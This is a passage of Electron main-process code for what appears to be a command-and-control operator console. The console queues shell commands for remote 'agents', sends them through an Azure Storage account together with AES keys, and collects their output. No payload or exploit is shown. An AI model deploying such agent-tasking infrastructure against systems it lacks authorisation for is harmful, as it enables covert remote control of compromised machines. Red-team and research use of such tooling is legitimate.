                            nodeIntegration: true
                        }
                    });
                    linksWindow.loadFile('links.html');
                    linksWindow.webContents.on('did-finish-load', () => {
                        // Add Azure storage account info to the agentsData
                        const azureData = {
                            hostname: global.config.storageAccount,
                            platform: "Azure Storage Account",
                            username: "",
                            fileName: "",
                            containerid: "",
                            IP: "",
                            PID: "",
                            arch: "",
                            mode: "",
                            agentid: ""
                        };
                        agentsData.push(azureData);
                        linksWindow.webContents.send('agent-links', agentsData);
                    });
                }
            }
        ]);
      contextMenu.popup(BrowserWindow.fromWebContents(event.sender));
    });
      // Right-click Context Menu
      ipcMain.on('show-context-menu', (event) => {
          const contextMenu = Menu.buildFromTemplate([
              { label: 'Undo', role: 'undo' },
              { label: 'Redo', role: 'redo' },
              { type: 'separator' },
              { label: 'Cut', role: 'cut' },
              { label: 'Copy', role: 'copy' },
              { label: 'Paste', role: 'paste' },
              { type: 'separator' },
              { label: 'Select All', role: 'selectAll' }
          ]);
          contextMenu.popup(BrowserWindow.fromWebContents(event.sender));
    });

    // Fix for macOS Clipboard Shortcuts
    ipcMain.on('copy', async (event) => {
        const focusedWindow = BrowserWindow.getFocusedWindow();
        if (focusedWindow) {
            const selectedText = await focusedWindow.webContents.executeJavaScript('window.getSelection().toString()');
            clipboard.writeText(selectedText);
        }
    });

    ipcMain.on('cut', async (event) => {
        const focusedWindow = BrowserWindow.getFocusedWindow();
        if (focusedWindow) {
            const selectedText = await focusedWindow.webContents.executeJavaScript('window.getSelection().toString()');
            clipboard.writeText(selectedText);
            focusedWindow.webContents.executeJavaScript('document.execCommand("cut")');
        }
    });

    ipcMain.on('paste', (event) => {
        const focusedWindow = BrowserWindow.getFocusedWindow();
        if (focusedWindow) {
            focusedWindow.webContents.paste();
        }
    });

    ipcMain.on('update-config', (event, newConfig) => {
        const configPath = directories.configFilePath;
        fs.writeFileSync(configPath, `module.exports = ${JSON.stringify(newConfig, null, 4)};`);
        console.log("Configuration updated:", newConfig);
        global.config    = newConfig;
    });

});

app.on('window-all-closed', () => {
    app.quit();
});

app.on('activate', () => {
    if (BrowserWindow.getAllWindows().length === 0) {
        createDashboardWindow();
    }
});

// Task Queue Processor - runs every 0.5 seconds
function processTaskQueue() {
    // Skip if already processing a task
    if (global.isProcessingTask) {
        return;
    }

    // Find the next queued task across all agents
    let nextTask = null;
    let taskAgent = null;

    for (let agent of global.agents) {
        if (agent.tasks && agent.tasks.length > 0) {
            const queuedTask = agent.tasks.find(task => task.status === 'queued');
            if (queuedTask) {
                nextTask = queuedTask;
                taskAgent = agent;
                break; // Process tasks in agent order
            }
        }
    }

    if (!nextTask || !taskAgent) {
        return; // No queued tasks found
    }

    // Mark as processing
    global.isProcessingTask = true;
    nextTask.status = 'processing';

    console.log(`[TASK QUEUE] Processing task ${nextTask.taskid} for agent ${taskAgent.agentid}`);

    // Process the task
    processTask(taskAgent, nextTask)
        .then((commandOutput) => {
            console.log(`[TASK QUEUE] Task ${nextTask.taskid} completed with output:`, commandOutput);
            // Detect error in output
            if (typeof commandOutput === 'string' && commandOutput.trim().toLowerCase().startsWith('error')) {
                nextTask.status = 'error';
            } else {
                nextTask.status = 'completed';
            }
            nextTask.output = commandOutput; // Save output to the task object
            // Send result back to the agent window
            const command_response = {
                'command': nextTask.command,
                'taskid': nextTask.taskid,
                'output': commandOutput,
                'status': nextTask.status
            };
            const agentWindow = global.agentWindowHandles[taskAgent.agentid];
            if (agentWindow && !agentWindow.isDestroyed()) {
                agentWindow.webContents.send('command-output', command_response);
            }
        })
        .catch((error) => {
            console.error(`[TASK QUEUE] Error processing task ${nextTask.taskid}:`, error);
            nextTask.status = 'error';
            nextTask.output = `Error: ${error.message}`; // Save error to the task object
            const command_response = {
                'command': nextTask.command,
                'taskid': nextTask.taskid,
                'output': `Error: ${error.message}`,
                'status': nextTask.status
            };

            const agentWindow = global.agentWindowHandles[taskAgent.agentid];
            if (agentWindow && !agentWindow.isDestroyed()) {
                agentWindow.webContents.send('command-output', command_response);
            }
        })
        .finally(() => {
            // Mark as no longer processing
            global.isProcessingTask = false;
            console.log(`[TASK QUEUE] Finished processing task ${nextTask.taskid}`);
        });
}

// Process individual task
async function processTask(agent, task) {
    try {
        // Ensure the command is included in the agent_object.tasks array as a string (legacy) or as an object with a command property
        const agent_object = {
            agentid: agent.agentid,
            tasks: [typeof task === 'string' ? { command: task } : task], // Always pass as object with command property
            // Include other necessary agent properties
            container: agent.container,
            key: agent.aes ? agent.aes.key : agent.key,
            iv: agent.aes ? agent.aes.iv : agent.iv,
            aes: agent.aes,
            blobs: agent.blobs,
            arch: agent.arch,
            hostname: agent.hostname,
            IP: agent.IP,
            osRelease: agent.osRelease,
            osType: agent.osType,
            PID: agent.PID,
            platform: agent.platform,
            Process: agent.Process,
            username: agent.username,
            checkin: agent.checkin,
            links: agent.links,
            mode: agent.mode
        };

        let commandOutput = false;
        while (commandOutput === false) {
            commandOutput = await az.uploadCommand(agent_object);
            if (commandOutput === false) {
                await new Promise(resolve => setTimeout(resolve, 3000));
            }
        }
        return commandOutput;
    } catch (error) {
        throw error;
    }
}

// Start task queue processor
function startTaskQueue() {
    console.log('[TASK QUEUE] Starting task queue processor...');
    setInterval(processTaskQueue, 500); // Run every 0.5 seconds
}
